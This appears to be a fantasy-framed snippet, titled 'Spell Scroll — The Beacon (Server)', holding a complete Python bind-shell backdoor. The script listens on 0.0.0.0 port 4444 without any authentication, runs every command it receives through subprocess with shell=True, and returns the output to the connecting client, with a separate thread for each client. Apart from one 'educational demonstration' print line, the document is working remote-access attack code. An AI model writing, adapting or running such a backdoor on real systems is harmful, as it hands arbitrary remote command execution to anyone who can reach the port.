**[Spell Scroll — The Beacon (Server)]**
```python
import socket
import subprocess
import threading
import sys

HOST = '0.0.0.0'
PORT = 4444

def handle_command(connection):
    while True:
        try:
            command = connection.recv(1024).decode('utf-8')
            if command.lower() in ['exit', 'quit']:
                break
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = output.stdout + output.stderr
            if not response:
                response = "[No output]"
            connection.send(response.encode('utf-8'))
        except ConnectionResetError:
            break
        except Exception as e:
            connection.send(f"[Error] {e}".encode('utf-8'))
            break
    connection.close()
    print("[Beacon] Client disconnected")

def start_beacon():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(5)
        print(f"[Beacon] Listening on port {PORT} (educational demonstration)")
        while True:
            connection, address = server.accept()
            print(f"[Beacon] Connection from {address[0]}:{address[1]}")
            thread = threading.Thread(target=handle_command, args=(connection,))
            thread.daemon = True
            thread.start()

if __name__ == "__main__":
    try:
        start_beacon()
    except KeyboardInterrupt:
        print("\n[Beacon] Shutting down.")
        sys.exit(0)
```
